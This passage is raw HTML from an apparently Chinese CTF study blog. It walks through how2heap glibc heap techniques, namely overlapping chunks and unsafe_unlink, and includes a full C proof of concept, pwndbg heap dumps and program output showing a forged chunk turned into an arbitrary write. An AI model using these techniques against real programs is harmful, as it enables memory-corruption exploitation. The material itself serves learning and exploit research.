chunk_p3\n&quot;</span>);<br><br>  <span class="hljs-number">57</span>   *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE</span><br>  <span class="hljs-number">58</span><br>► <span class="hljs-number">59</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);<br>  <br>  <span class="hljs-number">61</span>   <span class="hljs-built_in">free</span>(p2);<br>  <span class="hljs-number">62</span><br>► <span class="hljs-number">63</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);<br><br>  <span class="hljs-number">65</span>   p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>► <span class="hljs-number">66</span>   real_size_p6 = <span class="hljs-built_in">malloc_usable_size</span>(p6);<br></code></pre></td></tr></table></figure><p> 好了我们先运行一下分配下5个chunk</p> <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"> pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1009</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6033f0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1009</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6037e0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1009</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603bd0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1009</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603fc0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1009</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6043b0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">130129</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br>pwndbg&gt;<br></code></pre></td></tr></table></figure><p>可以看到已经分配了5个堆块p1,p2,p3,p4,p5</p><p>分别从0x603000,0x6033f0,0x6037e0,0x603bd0,0x603fc0,0x6043b0处开始</p><p>然后我们继续运行一下,free掉p2,此时</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x603bd0 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603bd0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br><br></code></pre></td></tr></table></figure><p>此时的chunk p2</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6033f0</span><br><span class="hljs-number">0x6033f0</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000003f1</span><br><span class="hljs-number">0x603400</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603410</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603420</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603430</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br>pwndbg&gt; p/x <span class="hljs-number">0</span>x3f1<br>$<span class="hljs-number">4</span> = <span class="hljs-number">0</span>x3f1<br>pwndbg&gt; p <span class="hljs-number">0</span>x3f1<br>$<span class="hljs-number">5</span> = <span class="hljs-number">1009</span><br></code></pre></td></tr></table></figure><p>可以看到其size此时为0x3f1,而pre_size为chunk1所复用,紧接着我们继续,程序现在已经更改了chunk p2的size域</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6033f0</span><br><span class="hljs-number">0x6033f0</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000007e1</span><br><span class="hljs-number">0x603400</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603410</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603420</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603430</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br>pwndbg&gt;<br></code></pre></td></tr></table></figure><p>好了,现在我们free掉chunk2并malloc一个新的chunk p6</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x6033f0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">4702111234474983745</span>,<br>  size = <span class="hljs-number">2017</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd2158</span> &lt;main_arena+<span class="hljs-number">1592</span>&gt;,<br>  bk = <span class="hljs-number">0x7ffff7dd2158</span> &lt;main_arena+<span class="hljs-number">1592</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x6033f0</span>,<br>  bk_nextsize = <span class="hljs-number">0x6033f0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时的p6 size大小为2017,我们看下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p p6</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">8 = (intptr_t *) 0x603400</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p p3</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">9 = (intptr_t *) 0x6037f0</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 2017</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">10 = 0x7e1</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p p6+0x7e1</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">11 = (intptr_t *) 0x607308</span><br></code></pre></td></tr></table></figure><p>此时的p3已经成功被包在p6中了:)</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>好了,程序首先malloc了5块大小为1008的chunk,p1,p2,p3,p4,p5</p><p>紧接着,程序free掉了p4,因为还有p5 紧邻着top chunk,因此p4并不会被合并到topchunk中</p><p><strong>这里要注意,在本例中,是否free p4的效果是一样的</strong></p><p>之后呢,为便于直观的看一下效果,将chunk按次序填满了A,B,C,D,E</p><p>紧接着,程序修改了chunk p2的size域大小为p2+p3,然后free掉了chunk p2</p><p>这个时候,系统会错误的把p2和p3合并的大chunk放进unsorted bin中并与我们的free chunk p4合并</p><p>然后申请了p2+p3大小的新chunk p6(所以我说其实不用free p4的…甚至都不用malloc p5 2333</p><p>此时p6的后半部分也就是p3大小的部分就与之前未free的p3重叠了:)</p><p>这里也做一下overlapping_chunks和overlapping_chunks_2的比较</p><p>overlapping_chunks中,程序更改了已经释放掉的chunk的size域而2则是修改了还未释放的chunk的size域,但是效果都是一样的,都是构造了一个重叠块 (overlapping chunk!</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197583">https://www.anquanke.com/post/id/197583</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划二</title>
    <link href="/2020/01/19/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%8C/"/>
    <url>/2020/01/19/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>假期坚决不咕咕咕之系列二!!系列一中我记录了first-fit,fastbin_dup,fastbin_dup_into_stack和fastbin_dup_consolidate四个文件的三种攻击方式,那么这次就记录剩下的一些攻击方式叭!</p></blockquote><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<span class="hljs-regexp">/linux/g</span>libc-heap/<br>https:<span class="hljs-regexp">//</span>sourceware.org<span class="hljs-regexp">/git/</span>?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=<span class="hljs-number">07</span>c18a008c2ed8f5660adba2b778671db159a141<span class="hljs-comment">#l1344\n\n</span><br>http:<span class="hljs-regexp">//</span>blog.leanote.com<span class="hljs-regexp">/post/mu</span>t3p1g/how2heap<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2582</span><span class="hljs-comment">#toc-5</span><br></code></pre></td></tr></table></figure><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>buntu16.04,gdb(pwndbg)</p><h1 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h1><p>第一个就是经常会用到的一种技巧,unlink,下面我们先看源代码,同样的,我加了一小点注释并删了写作者的话</p><p>这里我觉得heap exploitation里的例子更容易理解一点23333,这是之前的一个<a href="https://nightrainy.github.io/2019/07/19/unlink-study/">总结</a></p><p>当然,不想跳转的小伙伴我也会对unlink做一下简单的介绍,具体的介绍我们调试着看:)</p><p>首先,什么是unlink?</p><p>所谓unlink就是为了取出双向链表中的一个chunk</p><p>那么什么时候需要取出双向链表中的chunk呢,也就是使用unlink的时机?</p><ul><li>malloc<ol><li>在恰好大小的large chunk处取chunk时</li><li>在比请求大小大的bin中取chunk时</li></ol></li><li>Free<ol><li>后向合并,合并物理相邻低物理地址空闲chunk时</li><li>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</li></ol></li><li>malloc_consolidate<ol><li>后向合并,合并物理相邻低地址空闲chunk时。</li><li>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）</li></ol></li><li>realloc<br>  前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）。</li></ul><p>攻击效果呢?</p><p>攻击效果就是 p处的指针会变为 p - 0x18;</p><p>好嘞下面我们回来,我删掉部分作者的话的大概意思:</p><p>请在ubuntu14.04和ubuntu16.04上测试,这个技巧运用在我们有一个已知区域的指针时,我们可以在这个指针上利用unlink这一技巧</p><p>最常见的情况就是出现在缓冲区上,这个缓冲区可能有溢出漏洞,或者上面有一个全局指针</p><p>好嘞我们直接看代码</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><br>        <span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//we want to be big enough not to use fastbins</span><br>        <span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br>        <span class="hljs-comment">//本测试的重点就是利用free来破坏我们的全局chunk0_ptr以实现任意地址写</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);<br><br>        chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>        <span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br><br>        <span class="hljs-comment">//全局指针为chunk0_ptr,我们将要攻击的chunk为chunk1_ptr</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);<br>        <br>        <span class="hljs-comment">//我们要在chunk0中伪造一个chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<br><br>        <span class="hljs-comment">//我们把我们的fake_chunk的fd指向我们的chunk0_ptr来满足P-&gt;FD-&gt;BK=P</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br><br>        chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>        <br>        <span class="hljs-comment">//我们把fake_chunk的bk指针指向我们的chunk0_ptr来满足P-&gt;BK-&gt;FD</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br><br>        <span class="hljs-comment">//通过这么设置,我们就可以成功bypass堆的检测即(P-&gt;FD-&gt;BK!=P||P-&gt;BK-&gt;FD!=P)==FALSE</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br>        chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br>        <span class="hljs-comment">//我们假设我们可以通过溢出chunk0使得我们可以自由的更改chunk1的内容</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<br>        <span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br><br>        <span class="hljs-comment">//我们用chunk1的previous_size来收缩chunk0,让free认为我们的chunk0是在我们的伪造的chunk的地方开始的</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);<br>        chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br><br>        <span class="hljs-comment">//如果我们正常的free chunk0,那么chunk1的pre_szie将是0x90,然而现在是一个新的值</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br><br>        <span class="hljs-comment">//我们通过将chunk1的pre_size设置为false,就可以将我们所伪造的chunk标记为free状态</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<br>        chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>        <span class="hljs-comment">//现在我们free chunk1,这时发生向后合并将会unlink我们所伪造的chunk,从而覆写chunk0_ptr</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(chunk1_ptr);<br><br>        <span class="hljs-comment">//在这个指针上,我们可以通过chunk0_ptr来覆写其自身以指向任意内存</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);<br>        <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br>        <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>        chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>        <span class="hljs-comment">//chunk0_ptr如今指向了我们想要的地方,我们可以用它来写我们的字符串了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Original value: %s\n&quot;</span>,victim_string);<br>        chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242LL</span>;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">The <span class="hljs-keyword">global</span> chunk0_ptr <span class="hljs-built_in">is</span> at <span class="hljs-number">0</span>x602070, pointing <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x255b010<br>The victim chunk we are going <span class="hljs-keyword">to</span> corrupt <span class="hljs-built_in">is</span> at <span class="hljs-number">0</span>x255b0a0<br><br>We create a fake chunk inside chunk0.<br>We setup the <span class="hljs-comment">&#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><br>We setup the <span class="hljs-comment">&#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><br><span class="hljs-keyword">With</span> this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == <span class="hljs-literal">False</span><br>Fake chunk fd: <span class="hljs-number">0</span>x602058<br>Fake chunk bk: <span class="hljs-number">0</span>x602060<br><br>We assume that we have an overflow <span class="hljs-keyword">in</span> chunk0 so that we can freely change chunk1 metadata.<br>We shrink the size <span class="hljs-keyword">of</span> chunk0 (saved <span class="hljs-keyword">as</span> <span class="hljs-comment">&#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><br>It<span class="hljs-comment">&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><br><span class="hljs-keyword">If</span> we had <span class="hljs-comment">&#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80</span><br>We mark our fake chunk <span class="hljs-keyword">as</span> free <span class="hljs-keyword">by</span> setting <span class="hljs-comment">&#x27;previous_in_use&#x27; of chunk1 as False.</span><br><br>Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.<br><br><br>At this point we can use chunk0_ptr <span class="hljs-keyword">to</span> overwrite itself <span class="hljs-keyword">to</span> point <span class="hljs-keyword">to</span> an arbitrary location.<br>chunk0_ptr <span class="hljs-built_in">is</span> now pointing <span class="hljs-keyword">where</span> we want, we use it <span class="hljs-keyword">to</span> overwrite our victim <span class="hljs-type">string</span>.<br>Original value: Hello!~<br><span class="hljs-built_in">New</span> Value: BBBBAAAA<br></code></pre></td></tr></table></figure><h2 id="关键部分调试"><a href="#关键部分调试" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>自己翻译的毛毛躁躁的,本来还大概知道是啥,结果看完有点懵,不过不要紧,我们根据源码上推荐的网站先把unlink部分代码拉过来</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 